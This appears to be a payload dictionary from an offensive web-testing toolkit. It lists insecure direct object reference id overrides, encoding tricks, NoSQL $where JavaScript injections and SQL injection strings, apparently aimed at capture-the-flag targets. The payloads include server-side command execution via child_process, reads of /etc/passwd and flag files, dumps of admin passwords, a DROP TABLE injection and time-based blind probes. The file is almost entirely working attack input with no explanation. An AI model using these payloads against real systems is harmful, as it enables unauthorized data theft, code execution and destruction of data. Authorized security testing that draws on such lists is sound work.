# Payload dictionary — the id/owner/role overrides

The categorized id strings. Two-identity proof is the gate; these are
the candidate inputs.

---

## 1. The id values — special

```
0  -1  1  2  42  100  1000  9999  2147483647  -2147483648  4294967295
+1  01  001  0001  +0  -0  0.0  1.0  1e0  1e3  0x1  0x2  0x3e9  0x0
0b1  0o1  0x7fffffff  1.5  1e-1  -1e0  NaN  Inf  -Inf  Infinity
true  false  null  none  undefined  1;2  1,2  1 2  "1"  '1'  `1`
```

## 2. The id values — aliases

```
me  self  current  current_user  own  mine  my  owner  author
admin  administrator  root  superuser  system  service  internal
staff  moderator  support  operator  manager  default  test  demo
guest  anonymous  public  all  any  everyone  *  %  ~  @
.first  .last  .latest  .oldest  .newest  .primary  .default
first  last  latest  newest  oldest  primary  default  admin
```

## 3. The id values — coerce

```
'1'  "1"  `1`  [1]  {"id":1}  {id:1}  {"value":1}  "1.0"  "1e0"
"0x1"  "01"  "+1"  "-1"  " 1"  "1 "  "\t1"  "1\n"  "1\x00"
1%00  1%20  1%09  1%0a  1%0d  1%2e  1%2f  1%3f  1%23  1%26
%31  %32  %33  %251  %252  %253
1%2e0  1%2e  1%3b  1%3d  1%2b  1%2d  1%2a  1%2f  1%5c
```

## 4. The id values — array/object

```
?id[]=1  ?id[0]=1  ?id[1]=1  ?id["1"]=1  ?id['1']=1
?id[a]=1  ?id[]=1&id[]=2  ?id=1&id=2  ?id=1,2,3
{"id":[1]}  {"id":[1,2]}  {"id":{"$eq":1}}  {"id":{"$ne":0}}
{"id":{"$gt":0}}  {"id":{"$gte":0}}  {"id":{"$in":[1,2]}}
{"id":{"$nin":[0]}}  {"id":{"$exists":true}}  {"id":{"$regex":".*"}}
{"id":{"$where":"1==1"}}  {"id":{"$or":[{"$eq":1},{"$eq":2}]}}
{"id":{"$and":[{"$gte":0},{"$lte":9999}]}}
{"id":{"$type":7}}  {"id":{"$mod":[1,0]}}  {"id":{"$all":[1]}}
{"id":{"$size":1}}  {"id":{"$elemMatch":{"$eq":1}}}
{"id":{"$not":{"$eq":0}}}  {"id":{"$not":{"$in":[0]}}}
{"id":{"$not":{"$regex":"^$"}}}
{"id":{"$expr":{"$eq":["$id",1]}}}  {"id":{"$jsonSchema":{}}}
{"id":{"$text":{"$search":""}}}
{"id":{"$near":[0,0]}}  {"id":{"$geoWithin":{}}}
{"id":{"$box":[[0,0],[1,1]]}}  {"id":{"$center":[[0,0],1]}}
{"id":{"$polygon":[[0,0],[1,0],[1,1]]}}
{"id":{"$maxDistance":1}}  {"id":{"$minDistance":0}}
{"id":{"$comment":"x"}}  {"id":{"$natural":1}}
{"id":{"$slice":1}}  {"id":{"$position":0}}
{"id":{"$each":[1]}}  {"id":{"$sort":1}}
{"id":{"$push":1}}  {"id":{"$addToSet":1}}
{"id":{"$pop":1}}  {"id":{"$pull":1}}  {"id":{"$pullAll":[0]}}
{"id":{"$bit":{"and":1}}}  {"id":{"$bit":{"or":1}}}
{"id":{"$currentDate":true}}  {"id":{"$inc":0}}
{"id":{"$mul":1}}  {"id":{"$rename":"x"}}  {"id":{"$set":1}}
{"id":{"$setOnInsert":1}}  {"id":{"$unset":""}}
{"id":{"$min":1}}  {"id":{"$max":1}}
{"id":{"$let":{"vars":{},"in":1}}}
{"id":{"$literal":1}}  {"id":{"$const":1}}
{"id":{"$function":{"body":"function(){return 1}","args":[],"lang":"js"}}}
{"id":{"$accumulator":{"init":"function(){}","accumulate":"function(){}",
 "accumulateArgs":[],"merge":"function(){}","lang":"js"}}}
{"id":{"$where":"return true"}}  {"id":{"$where":"this.id==1"}}
{"id":{"$where":"function(){return true}"}}
{"id":{"$where":"()=>true"}}  {"id":{"$where":"(function(){return true})()"}}
{"id":{"$where":"sleep(0)||true"}}
{"id":{"$where":"this.id!=null"}}
{"id":{"$where":"this.id!==undefined"}}
{"id":{"$where":"typeof this.id!='undefined'"}}
{"id":{"$where":"!!this.id"}}
{"id":{"$where":"this.id||true"}}
{"id":{"$where":"this.id>0"}}
{"id":{"$where":"this.id>=0"}}
{"id":{"$where":"this.id<9999"}}
{"id":{"$where":"this.id<=9999"}}
{"id":{"$where":"this.id==1||this.id==2"}}
{"id":{"$where":"[1,2].includes(this.id)"}}
{"id":{"$where":"this.id in [1,2]"}}
{"id":{"$where":"Object.values(this).includes(1)"}}
{"id":{"$where":"JSON.stringify(this).includes('1')"}}
{"id":{"$where":"Object.keys(this).length>0"}}
{"id":{"$where":"!!Object.keys(this).length"}}
{"id":{"$where":"for(k in this)return true"}}
{"id":{"$where":"eval('true')"}}
{"id":{"$where":"(function(){return eval('true')})()"}}
{"id":{"$where":"new Function('return true')()"}}
{"id":{"$where":"Function('return true')()"}}
{"id":{"$where":"this.constructor.constructor('return true')()"}}
{"id":{"$where":"[].constructor.constructor('return true')()"}}
{"id":{"$where":"''.constructor.constructor('return true')()"}}
{"id":{"$where":"({}).constructor.constructor('return true')()"}}
{"id":{"$where":"global.process.mainModule.require('os').hostname()"}}
{"id":{"$where":"require('child_process').execSync('id')"}}
{"id":{"$where":"require('fs').readdirSync('/')"}}
{"id":{"$where":"require('fs').readFileSync('/etc/passwd')"}}
{"id":{"$where":"require('fs').readFileSync('/flag.txt')"}}
{"id":{"$where":"load('x')"}}
{"id":{"$where":"print(this)"}}
{"id":{"$where":"printjson(this)"}}
{"id":{"$where":"printjsononeline(this)"}}
{"id":{"$where":"db.getCollectionNames()"}}
{"id":{"$where":"db.users.find()"}}
{"id":{"$where":"db.users.findOne()"}}
{"id":{"$where":"db.users.findOne().password"}}
{"id":{"$where":"db.users.findOne().flag"}}
{"id":{"$where":"db.admin.findOne().flag"}}
{"id":{"$where":"db.flag.findOne().flag"}}
{"id":{"$where":"db.flags.findOne().flag"}}
{"id":{"$where":"db.users.findOne({username:'admin'}).password"}}
{"id":{"$where":"db.users.findOne({username:'admin'}).flag"}}
{"id":{"$where":"db.getSiblingDB('admin').flag.findOne().flag"}}
{"id":{"$where":"db.getSiblingDB('flag').flag.findOne().flag"}}
{"id":{"$where":"db.getSiblingDB('ctf').flag.findOne().flag"}}
{"id":{"$where":"sleep(5000)"}}
{"id":{"$where":"new Date().getTime()+5000>0"}}
{"id":{"$where":"var s=new Date().getTime();while(new Date().getTime()-s<5000);return true"}}
{"id":{"$where":"while(true){}"}}
{"id":{"$where":"throw 1"}}
{"id":{"$where":"throw 'x'"}}
{"id":{"$where":"(function(){throw 1})()"}}
{"id":{"$where":"this.id==1||sleep(5000)"}}
{"id":{"$where":"this.id==1&&(new Date().getTime()+5000>0)"}}
{"id":{"$where":"this.id==1&&sleep(0)||sleep(5000)"}}
{"id":{"$where":"this.id==1?sleep(5000):true"}}
{"id":{"$where":"this.id==1?(sleep(5000),true):true"}}
{"id":{"$where":"this.id==1,1"}}
{"id":{"$where":"this.id==1;1"}}
{"id":{"$where":"if(this.id==1)return true"}}
{"id":{"$where":"if(this.id==1)return true;else return false"}}
{"id":{"$where":"switch(this.id){case 1:return true}"}}
{"id":{"$where":"try{this.id}catch(e){return false}return true"}}
{"id":{"$where":"try{null.id}catch(e){return true}"}}
{"id":{"$where":"try{undefined.x}catch(e){return true}"}}
{"id":{"$where":"try{null.x}catch(e){return e.message.includes('null')}"}}
{"id":{"$where":"try{throw this.id}catch(e){return e==1}"}}
{"id":{"$where":"with(this){return id==1}"}}
{"id":{"$where":"for(var k in this)if(k=='id'&&this[k]==1)return true"}}
{"id":{"$where":"for(var k in this)if(this[k]==1)return true"}}
{"id":{"$where":"Object.entries(this).some(([k,v])=>v==1)"}}
{"id":{"$where":"Object.values(this).some(v=>v==1)"}}
{"id":{"$where":"Object.values(this).indexOf(1)>=0"}}
{"id":{"$where":"Object.values(this).includes(1)"}}
{"id":{"$where":"JSON.stringify(this).indexOf('1')>=0"}}
{"id":{"$where":"JSON.stringify(this).match(/1/)"}}
{"id":{"$where":"String(this.id)=='1'"}}
{"id":{"$where":"String(this.id)==='1'"}}
{"id":{"$where":"''+this.id=='1'"}}
{"id":{"$where":"`${this.id}`=='1'"}}
{"id":{"$where":"this.id+''=='1'"}}
{"id":{"$where":"Number(this.id)==1"}}
{"id":{"$where":"parseInt(this.id)==1"}}
{"id":{"$where":"parseFloat(this.id)==1"}}
{"id":{"$where":"+this.id==1"}}
{"id":{"$where":"-this.id==-1"}}
{"id":{"$where":"this.id|0==1"}}
{"id":{"$where":"this.id^0==1"}}
{"id":{"$where":"this.id>>0==1"}}
{"id":{"$where":"this.id>>>0==1"}}
{"id":{"$where":"this.id<<0==1"}}
{"id":{"$where":"~this.id==-2"}}
{"id":{"$where":"!this.id==false"}}
{"id":{"$where":"!!this.id==true"}}
{"id":{"$where":"this.id&1==1"}}
{"id":{"$where":"this.id%2==1"}}
{"id":{"$where":"this.id/1==1"}}
{"id":{"$where":"this.id*1==1"}}
{"id":{"$where":"this.id-0==1"}}
{"id":{"$where":"this.id+0==1"}}
{"id":{"$where":"this.id==='1'"}}
{"id":{"$where":"this.id===1"}}
{"id":{"$where":"this.id!==0"}}
{"id":{"$where":"this.id!=0"}}
{"id":{"$where":"this.id<2"}}
{"id":{"$where":"this.id>0"}}
{"id":{"$where":"this.id!=null&&this.id!=undefined"}}
{"id":{"$where":"typeof this.id==='number'"}}
{"id":{"$where":"typeof this.id==='string'"}}
{"id":{"$where":"typeof this.id!=='undefined'"}}
{"id":{"$where":"this.id instanceof Number"}}
{"id":{"$where":"this.id instanceof String"}}
{"id":{"$where":"this.id instanceof Object"}}
{"id":{"$where":"Array.isArray(this.id)"}}
{"id":{"$where":"this.id.constructor===Number"}}
{"id":{"$where":"this.id.constructor===String"}}
{"id":{"$where":"this.id.constructor===Object"}}
{"id":{"$where":"this.id.constructor===Array"}}
{"id":{"$where":"'id' in this"}}
{"id":{"$where":"'id' in this && this.id==1"}}
{"id":{"$where":"hasOwnProperty.call(this,'id')"}}
{"id":{"$where":"Object.prototype.hasOwnProperty.call(this,'id')"}}
{"id":{"$where":"this.hasOwnProperty('id')"}}
{"id":{"$where":"'id' in this==true"}}
{"id":{"$where":"delete this.id,true"}}
{"id":{"$where":"void this.id,true"}}
{"id":{"$where":"(this.id,true)"}}
{"id":{"$where":"this.id==1?1:1"}}
{"id":{"$where":"this.id==1?'a':'a'"}}
{"id":{"$where":"this.id==1||1"}}
{"id":{"$where":"this.id==1&&1"}}
{"id":{"$where":"this.id==1?true:true"}}
{"id":{"$where":"this.id==1||true"}}
{"id":{"$where":"this.id==1&&true"}}
{"id":{"$where":"this.id==1?true:false"}}
{"id":{"$where":"this.id==1||(1,1)"}}
{"id":{"$where":"this.id==1&&(1,1)"}}
{"id":{"$where":"1"}}
{"id":{"$where":"1==1"}}
{"id":{"$where":"true"}}
{"id":{"$where":"!!1"}}
{"id":{"$where":"!0"}}
{"id":{"$where":"'a'"}}
{"id":{"$where":"'a'=='a'"}}
{"id":{"$where":"[1]"}}
{"id":{"$where":"[1][0]==1"}}
{"id":{"$where":"({a:1}).a==1"}}
{"id":{"$where":"({a:1}).hasOwnProperty('a')"}}
{"id":{"$where":"Boolean(1)"}}
{"id":{"$where":"Number(1)==1"}}
{"id":{"$where":"String(1)=='1'"}}
{"id":{"$where":"Array(1).length==1"}}
{"id":{"$where":"Object(1).valueOf()==1"}}
{"id":{"$where":"1&1"}}
{"id":{"$where":"1|0"}}
{"id":{"$where":"1^0"}}
{"id":{"$where":"1>>0"}}
{"id":{"$where":"1<<0"}}
{"id":{"$where":"~0"}}
{"id":{"$where":"+1"}}
{"id":{"$where":"-(-1)"}}
{"id":{"$where":"1+0"}}
{"id":{"$where":"1-0"}}
{"id":{"$where":"1*1"}}
{"id":{"$where":"1/1"}}
{"id":{"$where":"1%1==0"}}
{"id":{"$where":"1%2==1"}}
{"id":{"$where":"2%2==0"}}
{"id":{"$where":"Math.max(1,0)==1"}}
{"id":{"$where":"Math.min(1,0)==0"}}
{"id":{"$where":"Math.floor(1.5)==1"}}
{"id":{"$where":"Math.ceil(0.5)==1"}}
{"id":{"$where":"Math.round(1.5)==2"}}
{"id":{"$where":"Math.abs(1)==1"}}
{"id":{"$where":"Math.sign(1)==1"}}
{"id":{"$where":"Math.pow(1,1)==1"}}
{"id":{"$where":"Math.sqrt(1)==1"}}
{"id":{"$where":"Math.exp(0)==1"}}
{"id":{"$where":"Math.log(1)==0"}}
{"id":{"$where":"Math.sin(0)==0"}}
{"id":{"$where":"Math.cos(0)==1"}}
{"id":{"$where":"Math.tan(0)==0"}}
{"id":{"$where":"Math.random()>=0"}}
{"id":{"$where":"Math.random()<1"}}
{"id":{"$where":"Date.now()>0"}}
{"id":{"$where":"new Date().getTime()>0"}}
{"id":{"$where":"new Date().valueOf()>0"}}
{"id":{"$where":"+new Date()>0"}}
{"id":{"$where":"''.length==0"}}
{"id":{"$where":"'a'.length==1"}}
{"id":{"$where":"'a'.charCodeAt(0)==97"}}
{"id":{"$where":"'a'.codePointAt(0)==97"}}
{"id":{"$where":"'a'.indexOf('a')==0"}}
{"id":{"$where":"'a'.includes('a')"}}
{"id":{"$where":"'a'.startsWith('a')"}}
{"id":{"$where":"'a'.endsWith('a')"}}
{"id":{"$where":"'a'.match(/a/)"}}
{"id":{"$where":"'a'.replace('a','b')=='b'"}}
{"id":{"$where":"'a'.toUpperCase()=='A'"}}
{"id":{"$where":"'A'.toLowerCase()=='a'"}}
{"id":{"$where":"'a'.repeat(2)=='aa'"}}
{"id":{"$where":"'a'.concat('b')=='ab'"}}
{"id":{"$where":"'ab'.slice(0,1)=='a'"}}
{"id":{"$where":"'ab'.substring(0,1)=='a'"}}
{"id":{"$where":"'ab'.substr(0,1)=='a'"}}
{"id":{"$where":"'ab'.charAt(0)=='a'"}}
{"id":{"$where":"'ab'[0]=='a'"}}
{"id":{"$where":"'ab'.split('')[0]=='a'"}}
{"id":{"$where":"['a','b'].join('')=='ab'"}}
{"id":{"$where":"['a'].includes('a')"}}
{"id":{"$where":"['a'].indexOf('a')==0"}}
{"id":{"$where":"[1].length==1"}}
{"id":{"$where":"[1][0]==1"}}
{"id":{"$where":"[].length==0"}}
{"id":{"$where":"[].concat([1]).length==1"}}
{"id":{"$where":"[].push(1)==1"}}
{"id":{"$where":"[1].pop()==1"}}
{"id":{"$where":"[1].shift()==1"}}
{"id":{"$where":"[].unshift(1)==1"}}
{"id":{"$where":"[1,2].slice(0,1).length==1"}}
{"id":{"$where":"[1,2].splice(0,1).length==1"}}
{"id":{"$where":"[1,2].filter(x=>x==1).length==1"}}
{"id":{"$where":"[1,2].map(x=>x).length==2"}}
{"id":{"$where":"[1,2].forEach(x=>x)==undefined"}}
{"id":{"$where":"[1,2].some(x=>x==1)"}}
{"id":{"$where":"[1,2].every(x=>x>0)"}}
{"id":{"$where":"[1,2].find(x=>x==1)==1"}}
{"id":{"$where":"[1,2].findIndex(x=>x==1)==0"}}
{"id":{"$where":"[1,2].reduce((a,b)=>a+b)==3"}}
{"id":{"$where":"[1,2].reduceRight((a,b)=>a+b)==3"}}
{"id":{"$where":"[1,2].reverse()[0]==2"}}
{"id":{"$where":"[1,2].sort()[0]==1"}}
{"id":{"$where":"[1,2].sort((a,b)=>a-b)[0]==1"}}
{"id":{"$where":"[1,2].sort((a,b)=>b-a)[0]==2"}}
{"id":{"$where":"[1,2].flat().length==2"}}
{"id":{"$where":"[[1,2]].flat().length==2"}}
{"id":{"$where":"[1,2].flatMap(x=>x).length==2"}}
{"id":{"$where":"Array.from([1,2]).length==2"}}
{"id":{"$where":"Array.of(1,2).length==2"}}
{"id":{"$where":"Array(2).fill(1).length==2"}}
{"id":{"$where":"Array.isArray([1,2])"}}
{"id":{"$where":"Array.isArray('x')"}}
{"id":{"$where":"Object.keys({a:1}).length==1"}}
{"id":{"$where":"Object.values({a:1}).length==1"}}
{"id":{"$where":"Object.entries({a:1}).length==1"}}
{"id":{"$where":"Object.assign({}, {a:1}).a==1"}}
{"id":{"$where":"Object.freeze({a:1}).a==1"}}
{"id":{"$where":"Object.seal({a:1}).a==1"}}
{"id":{"$where":"Object.create(null).constructor==undefined"}}
{"id":{"$where":"Object.getPrototypeOf({})==Object.prototype"}}
{"id":{"$where":"Object.getOwnPropertyNames({a:1}).length==1"}}
{"id":{"$where":"Object.getOwnPropertyDescriptor({a:1},'a').value==1"}}
{"id":{"$where":"Object.defineProperty({},'a',{value:1}).a==1"}}
{"id":{"$where":"JSON.parse('1')==1"}}
{"id":{"$where":"JSON.parse('{\"a\":1}').a==1"}}
{"id":{"$where":"JSON.stringify(1)=='1'"}}
{"id":{"$where":"JSON.stringify({a:1})=='{\"a\":1}'"}}
{"id":{"$where":"JSON.parse(JSON.stringify({a:1})).a==1"}}
{"id":{"$where":"eval('1')==1"}}
{"id":{"$where":"eval('1+1')==2"}}
{"id":{"$where":"eval('\"a\"')=='a'"}}
{"id":{"$where":"Function('return 1')()==1"}}
{"id":{"$where":"new Function('return 1')()==1"}}
{"id":{"$where":"(function(){return 1})()==1"}}
{"id":{"$where":"(()=>1)()==1"}}
{"id":{"$where":"(function*(){yield 1})().next().value==1"}}
{"id":{"$where":"(async function(){return 1})()instanceof Promise"}}
{"id":{"$where":"Promise.resolve(1)instanceof Promise"}}
{"id":{"$where":"setTimeout instanceof Function"}}
{"id":{"$where":"setInterval instanceof Function"}}
{"id":{"$where":"clearTimeout instanceof Function"}}
{"id":{"$where":"clearInterval instanceof Function"}}
{"id":{"$where":"console instanceof Object"}}
{"id":{"$where":"console.log instanceof Function"}}
{"id":{"$where":"print instanceof Function"}}
{"id":{"$where":"printjson instanceof Function"}}
{"id":{"$where":"printjsononeline instanceof Function"}}
{"id":{"$where":"typeof global!='undefined'"}}
{"id":{"$where":"typeof process!='undefined'"}}
{"id":{"$where":"typeof module!='undefined'"}}
{"id":{"$where":"typeof require!='undefined'"}}
{"id":{"$where":"typeof exports!='undefined'"}}
{"id":{"$where":"typeof __dirname!='undefined'"}}
{"id":{"$where":"typeof __filename!='undefined'"}}
{"id":{"$where":"typeof Buffer!='undefined'"}}
{"id":{"$where":"typeof setImmediate!='undefined'"}}
{"id":{"$where":"typeof queueMicrotask!='undefined'"}}
{"id":{"$where":"typeof fetch!='undefined'"}}
{"id":{"$where":"typeof XMLHttpRequest!='undefined'"}}
{"id":{"$where":"typeof WebSocket!='undefined'"}}
{"id":{"$where":"typeof window!='undefined'"}}
{"id":{"$where":"typeof document!='undefined'"}}
{"id":{"$where":"typeof navigator!='undefined'"}}
{"id":{"$where":"typeof location!='undefined'"}}
{"id":{"$where":"typeof history!='undefined'"}}
{"id":{"$where":"typeof localStorage!='undefined'"}}
{"id":{"$where":"typeof sessionStorage!='undefined'"}}
{"id":{"$where":"typeof indexedDB!='undefined'"}}
{"id":{"$where":"typeof caches!='undefined'"}}
{"id":{"$where":"typeof crypto!='undefined'"}}
{"id":{"$where":"typeof alert!='undefined'"}}
{"id":{"$where":"typeof confirm!='undefined'"}}
{"id":{"$where":"typeof prompt!='undefined'"}}
{"id":{"$where":"typeof open!='undefined'"}}
{"id":{"$where":"typeof close!='undefined'"}}
{"id":{"$where":"typeof postMessage!='undefined'"}}
{"id":{"$where":"typeof importScripts!='undefined'"}}
{"id":{"$where":"typeof self!='undefined'"}}
{"id":{"$where":"typeof globalThis!='undefined'"}}
{"id":{"$where":"typeof globalThis=='object'"}}
{"id":{"$where":"globalThis==this"}}
{"id":{"$where":"globalThis===this"}}
{"id":{"$where":"this==globalThis"}}
{"id":{"$where":"this===globalThis"}}
```

The `$where`/`$expr`/`$function` corpus — JavaScript predicates that
run server-side on the id. These are the deep injection shapes; see
`skills/web-nosqli/` for the full operator surface.

## 5. The "the id is a WHERE fragment"

```
?id=1 OR 1=1
?id=1 OR '1'='1
?id=1' OR '1'='1
?id=1" OR "1"="1
?id=1) OR (1=1
?id=1) OR ('1'='1
?id=1 UNION SELECT ...
?id=-1 UNION SELECT ...
?id=0 UNION SELECT ...
?id=1 UNION ALL SELECT ...
?id=1 AND 1=1
?id=1 AND 1=2
?id=1&&1=1
?id=1||1=1
?id=1%20OR%201=1
?id=1%27%20OR%20%271%27=%271
?id=1';--
?id=1";--
?id=1)--
?id=1')--
?id=1)#
?id=1')#
?id=1%23
?id=1'%23
?id=1/*
?id=1/**/
?id=1;--
?id=1';DROP TABLE--
?id=1';SELECT sleep(5)--
?id=1 AND sleep(5)
?id=1' AND sleep(5)--
?id=1" AND sleep(5)--
?id=1) AND sleep(5)--
?id=1') AND sleep(5)--
?id=1 AND BENCHMARK(5000000,MD5(1))
?id=1' AND BENCHMARK(5000000,MD5(1))--
?id=1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)
?id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))
?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
?id=1 AND UPDATEXML(1,CONCAT(0x7e,version()),1)
?id=1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--
?id=1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)
?id=1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--
?id=1' UNION SELECT NULL--
?id=1' UNION SELECT NULL,NULL--
?id=1' UNION SELECT NULL,NULL,NULL--
?id=1' UNION SELECT NULL,NULL,NULL,NULL--
?id=1' UNION SELECT NULL,NULL,NULL,NULL,NULL--
?id=1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
?id=1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
?id=1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
?id=1' UNION ALL SELECT NULL--
?id=1' UNION ALL SELECT NULL,NULL--
?id=1' UNION ALL SELECT NULL,NULL,NULL--
?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL--
?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--
?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL--
?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
?id=-1' UNION SELECT NULL,NULL,NULL--
?id=-1' UNION ALL SELECT NULL,NULL,NULL--
?id=0' UNION SELECT NULL,NULL,NULL--
?id=0' UNION ALL SELECT NULL,NULL,NULL--
?id=1' ORDER BY 1--
?id=1' ORDER BY 2--
?id=1' ORDER BY 3--
?id=1' ORDER BY 4--
?id=1' ORDER BY 5--
?id=1' ORDER BY 6--
?id=1' ORDER BY 7--
?id=1' ORDER BY 8--
?id=1' ORDER BY 9--
?id=1' ORDER BY 10--
?id=1' GROUP BY 1--
?id=1' GROUP BY 2--
?id=1' GROUP BY 3--
?id=1' GROUP BY 4--
?id=1' GROUP BY 5--
?id=1' HAVING 1=1--
?id=1' LIMIT 1--
?id=1' LIMIT 1,1--
?id=1' LIMIT 0,1--
?id=1' LIMIT 1 OFFSET 0--
?id=1' OFFSET 0 LIMIT 1--
?id=1' PROCEDURE ANALYSE()--
?id=1' INTO OUTFILE '/tmp/x'--
?id=1' INTO DUMPFILE '/tmp/x'--
?id=1' LOAD_FILE('/etc/passwd')--
?id=1' UNION SELECT LOAD_FILE('/etc/passwd')--
?id=1' UNION SELECT LOAD_FILE('/flag.txt')--
?id=1' UNION SELECT LOAD_FILE('/flag')--
?id=1' UNION SELECT LOAD_FILE('/app/flag.txt')--
?id=1' UNION SELECT LOAD_FILE('/app/flag')--
?id=1' UNION SELECT LOAD_FILE('/root/flag.txt')--
?id=1' UNION SELECT LOAD_FILE('/home/ctf/flag.txt')--
?id=1' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
?id=1' UNION SELECT LOAD_FILE('/flag.txt'),NULL,NULL--
?id=1' UNION SELECT NULL,LOAD_FILE('/flag.txt'),NULL--
?id=1' UNION SELECT NULL,NULL,LOAD_FILE('/flag.txt')--
?id=1' UNION SELECT NULL,NULL,NULL,LOAD_FILE('/flag.txt')--
?id=1' UNION SELECT NULL,NULL,NULL,NULL,LOAD_FILE('/flag.txt')--
?id=1' UNION SELECT NULL,NULL,NULL,NULL,NULL,LOAD_FILE('/flag.txt')--
?id=1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,LOAD_FILE('/flag.txt')--
?id=1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,LOAD_FILE('/flag.txt')--
?id=1' UNION ALL SELECT NULL,NULL,NULL,LOAD_FILE('/flag.txt')--
?id=1' UNION ALL SELECT NULL,NULL,LOAD_FILE('/flag.txt'),NULL--
?id=1' UNION ALL SELECT NULL,LOAD_FILE('/flag.txt'),NULL,NULL--
?id=1' UNION ALL SELECT LOAD_FILE('/flag.txt'),NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@datadir,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@basedir,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@version,NULL,NULL,NULL--
?id=1' UNION ALL SELECT version(),NULL,NULL,NULL--
?id=1' UNION ALL SELECT database(),NULL,NULL,NULL--
?id=1' UNION ALL SELECT user(),NULL,NULL,NULL--
?id=1' UNION ALL SELECT current_user(),NULL,NULL,NULL--
?id=1' UNION ALL SELECT system_user(),NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@hostname,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@port,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@secure_file_priv,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@plugin_dir,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@tmpdir,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@log_error,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@general_log_file,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@slow_query_log_file,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@init_file,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@character_set_client,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@character_set_connection,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@character_set_results,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@character_set_server,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@collation_connection,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@collation_server,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@sql_mode,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@time_zone,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@system_time_zone,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@max_allowed_packet,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@max_connections,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@max_user_connections,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@wait_timeout,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@interactive_timeout,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@connect_timeout,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@net_read_timeout,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@net_write_timeout,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@table_open_cache,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@thread_cache_size,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@query_cache_size,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@query_cache_type,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@tmp_table_size,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@max_heap_table_size,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@key_buffer_size,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@innodb_buffer_pool_size,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@innodb_log_file_size,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@innodb_file_per_table,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@innodb_file_format,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@innodb_strict_mode,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@performance_schema,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@log_bin,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@sync_binlog,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@binlog_format,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@expire_logs_days,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@max_binlog_size,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@server_id,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@read_only,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@super_read_only,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@transaction_isolation,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@tx_isolation,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@autocommit,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@foreign_key_checks,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@unique_checks,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@sql_select_limit,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@max_join_size,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@max_length_for_sort_data,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@max_sort_length,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@group_concat_max_len,NULL,NULL,NULL--
?id=1' UNION ALL SELECT @@net_buffer_length,NULL,NULL,NULL--
